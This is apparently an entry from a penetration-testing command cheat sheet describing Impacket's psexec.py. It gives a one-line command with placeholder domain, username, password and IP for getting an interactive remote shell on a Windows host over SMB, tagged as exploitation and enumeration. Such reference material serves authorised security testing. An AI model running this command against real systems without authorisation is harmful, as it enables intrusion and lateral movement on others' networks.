---
description: |
  Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. Or can also be used to find writable shares on the target machine.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123
command: |
  python3 psexec.py test.local/john:password123@10.10.10.1
items:
  - Password
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - Enumeration
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
---
